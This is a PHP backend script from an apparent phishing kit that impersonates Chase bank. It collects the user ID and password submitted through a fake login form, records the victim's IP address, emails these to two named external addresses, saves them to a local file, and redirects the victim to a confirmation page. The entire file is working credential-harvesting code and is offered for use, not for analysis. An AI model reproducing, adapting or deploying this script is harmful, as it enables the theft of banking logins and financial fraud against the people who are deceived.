<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Chase Info-----------------------\n";
$message .= "User Id            : ".$_POST['formtext1']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "	mooremoney1900@gmail.com,mooremoney1800@hotmail.com";
$subject = "Result from Unknown";
$headers = "From: Chase Info<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("use.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: confirm.php");

	 
?>